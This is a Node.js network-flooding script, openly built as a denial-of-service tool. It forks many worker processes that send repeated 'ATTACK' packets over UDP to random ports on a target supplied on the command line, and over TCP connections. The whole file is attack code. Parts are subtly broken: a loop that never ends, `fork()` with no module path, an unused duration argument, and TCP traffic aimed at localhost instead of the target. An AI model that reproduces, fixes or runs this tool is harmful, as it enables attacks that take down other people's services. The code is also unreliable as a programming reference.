const net = require('net');
const dgram = require('dgram');
const { fork } = require('child_process');

const target = process.argv[2];
const time = process.argv[3];
const portTCP = process.argv[4];
const portUDP = process.argv[5];
const udpThreadCount = parseInt(process.argv[6]) || 100;
const tcpThreadCount = parseInt(process.argv[7]) || 100;
const udpChunkSize = Math.floor(Math.random() * 10) + 50;
const udpInterval = Math.floor(Math.random() * 10) + 50;
const tcpInterval = Math.floor(Math.random() * 10) + 50;

const udpAddrList = [];

for (let i = 0; i < udpThreadCount; i++) {
  const port = Math.floor(Math.random() * 65535) + 1;
  udpAddrList.push(`${target}:${port}`);
}

if (require('cluster').isMaster) {
  const workerCount = udpThreadCount > tcpThreadCount ? udpThreadCount : tcpThreadCount;

  // Fork worker processes
  for (let i = 0; i < workerCount; i++) {
    fork();
  }

  // Recycle worker processes
  require('cluster').on('exit', (worker, code, signal) => {
    console.log(`Worker ${worker.process.pid} died with code ${code}`);
    fork();
  });
} else {
  const sender = process.argv[8] === 'udp' ? sendUDP : sendTCP;

  for (let i = 0; i < udpThreadCount || tcpThreadCount; i++) {
    sender(i);
  }
}

function sendUDP(index) {
  const randomUDPAddr = udpAddrList[index % udpAddrList.length];
  const clientUDP = dgram.createSocket('udp4');

  const interval = udpInterval + Math.floor(Math.random() * 100);

  setInterval(() => {
    if (process.send) {
      process.send('working');
    }

    const data = 'ATTACK'.repeat(udpChunkSize);
    clientUDP.send(data, 0, data.length, randomUDPAddr.split(':')[1], randomUDPAddr.split(':')[0], (err) => {
      if (err) {
        console.error(err);
      }
    });
  }, interval);
}

function sendTCP(index) {
  const randomTCPAddr = `127.0.0.1:${Math.floor(Math.random() * 10000) + 1}`;
  const clientTCP = new net.Socket();

  clientTCP.on('error', (err) => {
    console.log(err);

    if (process.send) {
      process.send('error');
    }

    clientTCP.destroy();
  });

  const interval = tcpInterval + Math.floor(Math.random() * 100);

  clientTCP.on('connect', () => {
    console.log(`Worker ${process.pid} started TCP attack to ${randomTCPAddr.split(':')[1]}`);

    if (process.send) {
      process.send({
        type: 'info',
        message: `Worker ${process.pid} started TCP attack to ${randomTCPAddr.split(':')[1]}`
      });
    }

    setInterval(() => {
      const data = 'ATTACK';
      clientTCP.write(data);

      if (process.send) {
        process.send({
          type: 'write',
          message: data
        });
      }
    }, interval);
  });

  clientTCP.connect(randomTCPAddr.split(':')[1], randomTCPAddr.split(':')[0], () => {
    console.log(`Worker ${process.pid} connected to ${randomTCPAddr.split(':')[1]}`);
  });
}